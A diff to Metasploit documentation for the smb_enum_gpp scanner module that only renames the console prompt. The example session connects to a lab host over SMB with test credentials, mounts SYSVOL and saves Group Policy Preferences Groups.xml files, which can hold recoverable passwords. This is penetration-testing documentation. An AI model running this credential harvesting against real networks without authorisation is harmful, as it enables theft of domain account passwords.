@@ -42,14 +42,14 @@ Example steps in this format (is also in the PR):
 The following example use the contrived setup from the "Test Environment" section.
 
 ```
-msf6 auxiliary(scanner/smb/smb_enum_gpp) > use auxiliary/scanner/smb/smb_enum_gpp 
-msf6 auxiliary(scanner/smb/smb_enum_gpp) > set RHOSTS 192.168.159.10
+msf auxiliary(scanner/smb/smb_enum_gpp) > use auxiliary/scanner/smb/smb_enum_gpp 
+msf auxiliary(scanner/smb/smb_enum_gpp) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(scanner/smb/smb_enum_gpp) > set SMBUSER smcintyre
+msf auxiliary(scanner/smb/smb_enum_gpp) > set SMBUSER smcintyre
 SMBUSER => smcintyre
-msf6 auxiliary(scanner/smb/smb_enum_gpp) > set SMBPass Password1
+msf auxiliary(scanner/smb/smb_enum_gpp) > set SMBPass Password1
 SMBPass => Password1
-msf6 auxiliary(scanner/smb/smb_enum_gpp) > run
+msf auxiliary(scanner/smb/smb_enum_gpp) > run
 
 [*] 192.168.159.10:445    - Connecting to the server...
 [*] 192.168.159.10:445    - Mounting the remote share \\192.168.159.10\SYSVOL'...
@@ -73,5 +73,5 @@ msf6 auxiliary(scanner/smb/smb_enum_gpp) > run
 [+] 192.168.159.10:445    - Groups.xml saved as: /home/smcintyre/.msf4/loot/20200828163158_default_192.168.159.10_smb.shares.file_279441.xml
 [*] 192.168.159.10:445    - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/smb/smb_enum_gpp) >
+msf auxiliary(scanner/smb/smb_enum_gpp) >
 ```
